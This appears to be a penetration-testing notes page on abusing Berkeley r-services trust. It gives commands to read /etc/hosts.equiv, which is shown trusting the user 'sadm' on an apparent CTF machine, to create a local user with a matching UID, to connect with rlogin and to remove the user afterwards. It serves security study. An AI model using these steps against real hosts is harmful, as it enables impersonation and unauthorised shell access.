---
title: "R Services"
date: 2025-7-16
tags: ["R Services", "rlogin", "rexec", "rsh", "r-commands", "Shell", "Berkeley", "uid", "gid"]
---

### Abuse #1: Fake a User

#### 1. Check

```console
cat /etc/hosts.equiv
```

```console {class="sample-code"}
(remote) www-data@reset:/home/sadm$ cat /etc/hosts.equiv
# /etc/hosts.equiv: list  of  hosts  and  users  that are granted "trusted" r
#                   command access to your system .
- root
- local
+ sadm
```

#### 2. Create the Target User Locally

```console
# Create a fake user
sudo adduser --uid <UID> <USER>
```

```console
# Switch user
su <USER>
```

#### 3. Connect

```console
# Installation
sudo apt install rsh-redone-client
```

```console
# Connect
rlogin <TARGET>
```

#### 4. Revert

```console
sudo userdel <USER>
```